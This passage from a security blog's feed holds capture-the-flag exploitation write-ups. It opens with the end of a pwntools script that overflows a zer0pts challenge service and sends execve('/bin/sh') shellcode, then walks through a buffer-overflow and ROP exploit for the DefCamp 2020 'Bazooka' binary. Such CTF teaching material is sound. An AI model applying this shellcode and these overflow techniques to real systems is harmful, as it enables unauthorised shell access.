&lt;span class=&quot;c1&quot;&gt;#p = process(&apos;./chall&apos;)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pwn.ctf.zer0pts.com&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9011&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;first_exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0060033c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s write the address of the vuln function. We have to avoid the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enter 0x100, 0&lt;/code&gt; because it will break our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp&lt;/code&gt; so we will use the next address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00400180&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;second_exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00400180&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And finally the last part. We will put the shellcode on 0x600740. We are writing on 0x0060023c so we need an offset of 0x504 (minus the 8 bytes from the address of the shellcode):&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;offset2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4fc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;third_exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x600740&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;third_exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we got it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/not-beginner-solved.png&quot; alt=&quot;Sections&quot; /&gt;&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Userspace" /><category term="Exploitation" /><summary type="html">WNKKKNW WXxc&apos;...&apos;:d0NW W0d:..&apos;cxxdl,..&apos;cx0N NOo;..,lOXW WKkl,..,cxKW WXkl&apos;..;o0N NKxc,..,lkXW WKxc&apos;..:xKW N0xc&apos;..;okXW N0d;..&apos;lkXW N0dc&apos;..:oOXW NOo,..,oON WNOd:&apos;.&apos;:xX Kl&apos;..;d0N WXx&apos; .dW Wo &apos;xX WKxc&apos;..c0 Ko;..,cxKN W0d:..&apos;ckXW WKkl,..,lxKW NOo,..,lON W0l. .,lkKW WXkl&apos;.. .:xKN N0d;..&apos;cl:&apos;..;okXW WKxc...:dOOd:&apos;..,lxKW NOo,..,lONW WXOo:...;oOXW N0d;...cxKW WXOo:...:0W WO,..;d0N WXOo;...;ok0ko,..,lOXW Xx&apos; .dW Wx. &apos;o0N WXkl;.....;o0N WXkl,..:xX W0d:&apos;.,cx0N WKOkOKW WKx:..&apos;ckXW WXOo:&apos;.,cxKN N0d;. .cON W0l. ..,lkKW WNOl,..,,..&apos;cd0N N0o;..&apos;ckOxc&apos;..,lkKW WKxc&apos;..:xKWWKxl,..,cx0N WOl,..;oON N0dc&apos;..;lkKW WKd:..&apos;ckXW NKxc. .oN Wx. &apos;o0N WNOd:&apos;..;lol;..,oON WXOl..&apos;xW 0:..;oOXW WXOo:&apos;.&apos;:d0N WXxc&apos;.&apos;ckXW WKxc,.&apos;:oOXW WNNNW WKd:..,oON N0xc,.&apos;:d0N N0o;..;d0N WN0d:&apos;.&apos;cd0N WXkl,.&apos;:xKW WN0d:&apos;.,cx0N WKxc&apos;.&apos;lkXW WXOo:&apos;.,cxKNWN0d:..,oONW WXOo;&apos;.,;,..;d0N WXOdookKW</summary></entry><entry><title type="html">Bazooka</title><link href="http://0.0.0.0:4000/2020/12/08/bazooka.html" rel="alternate" type="text/html" title="Bazooka" /><published>2020-12-08T00:00:00+01:00</published><updated>2020-12-08T00:00:00+01:00</updated><id>http://0.0.0.0:4000/2020/12/08/bazooka</id><content type="html" xml:base="http://0.0.0.0:4000/2020/12/08/bazooka.html">&lt;pre style=&quot;font-size: 0.5vw; text-align: center&quot;&gt;
                                                                                
                                                                                
                                                                          /@@@. 
                                                                        @@@@@@@ 
                                                                   @@@@@@@@@@   
                                                             @@@@@@@@@@@@@@     
                                                          @@@@@@@@@@@@@@@@      
                                                         @@@@@@@@@@@@@@@@       
                                                        @@@@@@@@@@@@@@@@        
                                                       @@@@@@@@@@@@@@@&amp;amp;         
                              @@@@                  #@@@@@@@@@@@@@@@,           
                                @@@@@            @@@@@@@@@@@@@@.                
                                  @@@@@@*     @    .@@@@@@@                     
                                @@@@@      @@@@@@@    @@@                       
                               @@@     @@@@@@@@@@@@@                            
                                    @@@@@@@@@@@@@@@@@                           
                                 @@@@@@@@@@@@@@@@@@                             
                               @@@@@@@@@@@@@@@@@@                               
                   @@@@@    @@@@@@@@@@@@@@@@@@@@@@@                             
                 @@@@,    @@@@@@@@@@@@@@@@@@@@   @@@&amp;amp;                           
               @@@@    @@@@@@@@@@@@@@@@@@@@@.     @@@                           
               @,    @@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@                            
                  &amp;amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                              
                 @@@@@@@@@@@@@@@@@@@     @@@@@@@@@@@                            
               @@@@@@@@@@@@@@@@@@           @@@@@@@@@@.                         
              @@@@@@@@@@@@@@@@@               @@@@@@@@@@@                       
           @@@@@@@@@@@@@@@@@    ,@@@             @@@@@@@@                       
          @@@@@@@@@@@@@@      @@@@@@@@&amp;amp;            @@@@                         
  @@@@@@    *@@@@@@@           @@@@@@@@@                                        
  @@@@@@@@@    @@@               @@@@@@                                         
    @@@@@@@@@                                                                   
       @@@@@@@@.                                                                
         @@@@@@                                                                 
                                                                                
&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;This was a pwn challenge from the DefCamp CTF 2020 rated with 100 points. The description said:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.&lt;/p&gt;

  &lt;p&gt;Flag format: CTF{sha256}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;They give us a binary. When we run it we get:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/Fnz_WGNFfX7sxKMcyrSUnzvFLiLA9Hjtyj-u-gj1sdrPWfmVCSA_gLNChubeHLNMt-fK-7Yyv-CfeHcreavPJWYqq032N86UgokdCWbVRTZauBIV1lIb8V4UOWksTBYLcqTZIWm6&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I think that ‘Try harder!!’ message means that we have to put something there to actually do something. Well, let’s reverse it with &lt;a href=&quot;https://cutter.re/&quot;&gt;Cutter&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let’s open it and check the general information on the &lt;strong&gt;dashboard&lt;/strong&gt; window:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/FmvdwgbIh76HLfb9CaO0dx38QAlhZT86TE5tgdiTcwvvIwSzJupIPhRnw2nw5nhp417lmUK3xr7IsPAryJkgk6U_S-1ZQW9h7OApky4cemI7brYu3GnrevBlQ-sGoEa1xwgZZJHw&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This give us some useful information:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;No canary so a buffer overflow is easier&lt;/li&gt;
  &lt;li&gt;No crypto&lt;/li&gt;
  &lt;li&gt;Not stripped so we can see the names of everything&lt;/li&gt;
  &lt;li&gt;No PIC so the addresses of the instructions are static&lt;/li&gt;
  &lt;li&gt;NX bit so we can’t execute anything on the stack&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s open the main function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/MrNMRhrN5j4VibdR3YPyErLmDiS2nA8Cqgr8d2m0_7_8Y6KQEIM4qeN8UIk6euY9yQ55ODdOemqpQd1kQA09JdN-ZAujC5Q3zHkW2w311MLyD2sLaGhJwpQcChpXoRzB_3x7-9Y_&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is calling a &lt;strong&gt;helper&lt;/strong&gt; function, then creating 2 buffers, calling system with the string “clear” and finally calling &lt;strong&gt;l00p&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Well, that system call looks promising to pop a shell. Let’s take note of that and move on to the helper function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/bmdayO6IbbGUl0BqhBHuV3wF6lP_K0nWE_KSmykkDGgMpR6s36mbSqbuNUcgRlJtobzs2ZFeLClrmnieMbePn4NNz4nDmGtjOdybATs7DHmH1_rt4wBzZj9H_i0jycvimKYqukBa&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’m not sure what’s the point of this so let’s move on to the &lt;strong&gt;l00p&lt;/strong&gt; function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/nUsU4QuVawmflJJfn853qL7nz7RtlCAVr-ibI4LMaB7wja93PVrpmMTwcqilQ1QxRYGsbk57rIXxwNunov01OqxrkggbxWfFM9d8V2smYSssIyfPayQs3ZiUfFWmuxssfPh34HHe&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is definitely what we saw when we executed it. The welcome message and then a scanf the secret message. Then it compares it with the try_hard3r string and if they don’t match, print the Try_harder string and call fake. If they do, call vuln.&lt;/p&gt;

&lt;p&gt;Let’s check that try_hard3r string. Copy the address (0x00400a21) and look at that address in the hexdump view:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-8eOm2kPBnCM7IbB898P84MykSjhGLf3KyulFZMN8w5kYqraQpjx96mi4Kau2Z39DuWYf32FG9aryilPEHbbiBeDOBRz1aMf16VLmhaEBomAGuVEooEvXxhbdf0VO23t0NAfaKeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we know the correct secret message was: #!@{try_hard3r}. Now we are going to check the vuln function because, I mean, that name looks promising.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/AwNM-yORftvCBMKt14-K6xYmM5O-gFxw-r5pnEAipox43iK0W06ghiEQi1CGqH6g0DHN1m62sIvTLYoCHcWdhatkG21V_rlCPvs964a70j9nr7kr389MYMbbFpom-t11rWeMsEed&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, it is printing some strings back to us and finally calling scanf and printing ‘Hacker alert’. There is no length check so it looks like a buffer overflow. We can see that the programs write our input to var_70h and that is rbp - 0x70. So, if we write more than 0x78 bytes, we can override the return address.&lt;/p&gt;

&lt;h2 id=&quot;the-exploit&quot;&gt;THE EXPLOIT&lt;/h2&gt;

&lt;p&gt;At this moment, we know we can redirect the execution. The question now is what to do with that. It doesn’t look like the flag is loaded anywhere so we are trying to pop a shell. And that previous call to system will be perfect to get it.&lt;/p&gt;

&lt;p&gt;From the man page of system we get:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/D7axNE_G1ZIISBGOL9jBsFnRM7fiwxhWAc3ORXQQkAnuEqrGBDUIfjCc4TLmmriCb1FPNRXp7OPIrh8PSo6P2Y7igBDXLG_pFw28PFQYjPboSCerUj5bYWH_9kAR92VqdMjhhOh9&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This function just receives one parameter which is the command it’s going to be executed. This pointer to a string must be loaded into the rdi register.&lt;/p&gt;

&lt;p&gt;We can put the string ‘/bin/sh’ in some part of the memory that we know and then use that address. For example, the &lt;strong&gt;.data&lt;/strong&gt; section&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/KiahSxL43aCcXEOJU_Sn2BOns1Ks427I2dHEnpbO1GZBTztm2CvEFAwRmsWAi_ea2LRA4mLkUxICLKgpKCFWw7BNKpAzhrwi9eVtWpAyG2bBCu_r-hsJEbqCIYb7uXourrtKF4fH&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Do you remember that helper function? Well, now it makes sense. It’s adding the contents of rax to rdi, which is loaded from the stack from the contents of rbp. So we just have to put the address of ‘/bin/sh’ where rbp is going to take the contents from and call this helper function. Finally, redirect it to that call to system (remember there is no PIC so addresses are always the same)&lt;/p&gt;

&lt;h2 id=&quot;build-the-exploit&quot;&gt;BUILD THE EXPLOIT&lt;/h2&gt;

&lt;p&gt;I’m going to use pwntools (&lt;a href=&quot;https://www.google.com/url?q=https://github.com/Gallopsled/pwntools&amp;amp;sa=D&amp;amp;ust=1607429190450000&amp;amp;usg=AOvVaw06pICeL2bPxcoty1Wg6KWm&quot;&gt;https://github.com/Gallopsled/pwntools&lt;/a&gt;) which allows us to easily interact with binaries and plenty of other things.&lt;/p&gt;

&lt;p&gt;First is to run the binary and send the ‘#!@{try_hard3r}’ string&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/II3oC-KLQeolXh6zNf28Q3YB0X-pko6yKAN2fi_r3HoCy75A9QDP6w1An8V4qdy52bcC3WuMHy2WDIawkxKE4qPAJedVY3d8zpd0g2JiYIxDSMpyYpZuwXW1f2WeM4RiHT__6_4Y&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need the address of the helper function which is 0x00400815&lt;/p&gt;

&lt;p&gt;*Note: there is an issue with Ubuntu 18.04 that makes mandatory that the stack is aligned before calling some functions of glibc, like system, so we are going to add a ‘ret’ so the stack gets aligned (https://www.cameronwickes.com/stack-alignment-ubuntu-18-04-movaps/) so i’m going to take the address of the ret in the _init function (0x400596)&lt;/p&gt;

&lt;p&gt;The idea is to call a scanf with the address of .data (0x00601048) loaded so we can write there by using that helper function which puts the contents of rbp to rax so we can load the address.&lt;/p&gt;

&lt;p&gt;We are going to use the fake call to use the scanf. We are going to jump to the instruction which is marked as red:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/bl5SyOisZDih8EDDnrNpKHVf7QtQ-wE3f8r0A3iZHWhTU9MkkzNB5l8TEh-22zmqHcF1pCQMeR5ftyHBkaQWtRwrLNqwWcLaffshLQObq6oQbdBjbp5n52w7NhXGGJOArykwA5FE&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the previous load of the address into rax is not executed because we already have the address of .data in rax. Then it just calls l00p again.&lt;/p&gt;

&lt;p&gt;Let’s write that part:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/XjHPBNF5yXy7fbtOa6PGZAVUBK6Sf3jtYh5bTvXIeWTTOFCzgyTriAegKR09UC028PqzuzMmG7bV-rkWIYBjjE2Y0PgO9pnC01m-kPctXKuSCFNI1rdcBhsHrSX7Yq3xUjHTC85A&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, we have the string ‘/bin/sh’ in 0x00601048.&lt;/p&gt;

&lt;p&gt;After that, we are going to use gdb to take a look at the contents of rdi right before the ret (because that rbp address is added to the contents of rdi) so we set a breakpoint at that instruction.&lt;/p&gt;

&lt;p&gt;Run gdb with:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/PdE6tD2OXdNwYIhEBOpbahdaimSW5LNxq70dnsJ78tjqAc9838lqB2kvYBWEgqDtJNPxJ-uLe85pMRywRCp7zCM2EZN305xVmglah4vEyF1Um28nDncopvZPAL0md_2evrk8aW2i&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then check the addresses of the instructions with:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/QC_7Kp5BhxpupvgdRNVPOBAvvPt8ciaWESMQU0iU1YdJF6AkiB_TPBJpZyoKVv4JCh4LC90rJNDfysOMWkYdjGZ8oRlpS0p-DBB_J7hiRqXRlc2ZSzSVsLW6cj2h6mpVuL1_-8wb&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the instruction before the ret is at *vuln + 95:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/xv41K0FbG5XB9wUbJ9FAHdnQn4fldJTST4dhu-yTwhRAiccLfforlcOZLLhUQCXR8Hh-OH4ejGkPFPKrPj9dBW2MbmJ6R2qAWYj31R-bPMAChoOgvKlSHJbvnx-3KtwAsEcHTvtA&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, let’s add that to our script:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/YdrpPEXdnWDk8zDs96_-fOLVByJ1msyapxtrytzIxmoU-z1I3hY9YumZ7uPyIDKKAkilaFg03BPslmq6Lhj0GeSgZN5B1nXfyEYPkhRlEOs3Vlr1uCVPLlE9vjQk4BhOhtkyKA4D&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s send some test input:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/2_c351Wh8cNhbGXjl3VIw9XQfx0E-hbWYZCZ8qNUKcx5ktJKNokfBU4NXUEynlQm7YZvvBoGxHjPR5CqPPH8Rvm4kZ3SDK7hueW50zs46TB1oB-_3A7l3Uplbp-qb0CqhS0rff4d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Run it with python3 script.py so we can check what’s the amount in rdi with the info registers command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/rt64-Nb-jOMldP-GptL9VV-kpJcZMF8S94PWHg-3Bo3sHH4DoMcKJbADjrPdAHIEN_79-uMClS-l0uVzALuRd-ijvy2FoJfq5WJ66jfqRyK4TWHVcrIPZBZkWOKty6CZHExQLT5t&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rdi is 0x1 so we have to subtract 1 to the address in the last position of the 8 bytes.&lt;/p&gt;

&lt;p&gt;So the final address is going to be 0x00601048 - 1 = 0x00601047. Finally, the address of the system call in the main function: 0x00400872. So we send that:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/voh0dSqMYnitcmUa9DdaqcM6U7qtE4R_YIY4XbmxEj_eGmu023ds0ohTPQb1jubX9xb5RaEa376K00aFcNJHtO55asyw6te84TXOOT8Wzp7x99OdLXhKSrS69suoRthfjLakNA24&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Execute and we get the shell:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/45_ZI_0K81TWqeOwYXbxltAe-XNQPbHjXZpg_014hPEzfR-lgMWvoVFmDFjSLrAV3X0innrixB8XLrpPu-G07Ze7YlQaU4oGCISw44no4Dmxu5EpVARhs9YtYAsB7Gud0CzyC0fC&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Userspace" /><category term="Exploitation" /><summary type="html">/@@@. @@@@@@@ @@@@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@&amp;amp; @@@@ #@@@@@@@@@@@@@@@, @@@@@ @@@@@@@@@@@@@@. @@@@@@* @ .@@@@@@@ @@@@@ @@@@@@@ @@@ @@@ @@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@ @@@@@ @@@@@@@@@@@@@@@@@@@@@@@ @@@@, @@@@@@@@@@@@@@@@@@@@ @@@&amp;amp; @@@@ @@@@@@@@@@@@@@@@@@@@@. @@@ @, @@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@ &amp;amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@ @@@@@@@@@@@@@@@@@@ @@@@@@@@@@. @@@@@@@@@@@@@@@@@ @@@@@@@@@@@ @@@@@@@@@@@@@@@@@ ,@@@ @@@@@@@@ @@@@@@@@@@@@@@ @@@@@@@@&amp;amp; @@@@ @@@@@@ *@@@@@@@ @@@@@@@@@ @@@@@@@@@ @@@ @@@@@@ @@@@@@@@@ @@@@@@@@. @@@@@@</summary></entry><entry><title type="html">Hunting into the wild</title><link href="http://0.0.0.0:4000/2020/12/08/hunting-into-the-wild.html" rel="alternate" type="text/html" title="Hunting into the wild" /><published>2020-12-08T00:00:00+01:00</published><updated>2020-12-08T00:00:00+01:00</updated><id>http://0.0.0.0:4000/2020/12/08/hunting-into-the-wild</id><content type="html" xml:base="http://0.0.0.0:4000/2020/12/08/hunting-into-the-wild.html">&lt;pre style=&quot;font-size: 0.5vw; text-align: center&quot;&gt;
                                           ,,,,,                                
                               ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                   
                         ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,              
                     ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,          
                 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,      
              ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,   
            ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, 
          ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
        ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,  
       ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,     
     ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,           
                                                                                
                                                                                
                                                                                
  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                  
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%               
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%             
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%            
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%            
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%            
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%             
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%               
  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                  
                                                                                
                                                                                
                                                                                
     /////////////////////////////////////////////////////////////////          
       ////////////////////////////////////////////////////////////////////     
        //////////////////////////////////////////////////////////////////////  
          //////////////////////////////////////////////////////////////////////
            /////////////////////////////////////////////////////////////////// 
              //////////////////////////////////////////////////////////////    
                 /////////////////////////////////////////////////////////      
                     /////////////////////////////////////////////////          
                         /////////////////////////////////////////              
                               /////////////////////////////                    

&lt;/pre&gt;

&lt;hr /&gt;

